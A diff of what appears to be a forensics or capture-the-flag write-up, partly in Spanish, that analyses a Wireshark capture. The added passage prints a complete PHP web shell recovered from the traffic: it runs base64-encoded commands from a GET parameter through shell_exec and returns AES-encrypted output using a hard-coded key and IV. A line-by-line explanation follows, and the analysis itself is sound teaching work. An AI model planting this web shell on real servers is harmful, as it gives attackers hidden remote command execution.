@@ -139,7 +139,27 @@ En wireshark si vamos al frame del /bash de la flag numero 4 y hacermos Http str
 
 <img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/40e24cea-239a-45bd-8f26-4bee8a898ec0" />
 
+a simple base64 command has been echoed to the f54Avbg4.php file, let’s decode this by cyberchef:
 
+<?php $A4gVaGzH = "kF92sL0pQw8eTz17aB4xNc9VUm3yHd6G";
+$A4gVaRmV = "pZ7qR1tLw8Df3XbK";$A4gVaXzY = base64_decode($_GET["q"]);
+$a54vag = shell_exec($A4gVaXzY);
+$A4gVaQdF = openssl_encrypt($a54vag,"AES-256-CBC",$A4gVaGzH,OPENSSL_RAW_DATA,$A4gVaRmV);
+echo base64_encode($A4gVaQdF); ?>
+
+after reading the previous code, we can conclude it to the following:
+
+The attacker sends a Base64-encoded command in the q parameter → $_GET["q"]
+The command is Base64-decoded and stored in → $A4gVaXzY
+The decoded command is executed on the system using shell_exec()
+The command output is stored in → $a54vag
+The output is encrypted using AES-256-CBC
+Encryption key → $A4gVaGzH
+Initialization Vector (IV) → $A4gVaRmV
+Encrypted output stored in → $A4gVaQdF
+The encrypted output is Base64-encoded
+The server sends the final encoded encrypted data back in the HTTP response
+after knowing how this attack actually works, we can decode and decrypt everything peacefully.
 
 ```php
 $a54vag = shell_exec($A4gVaXzY);
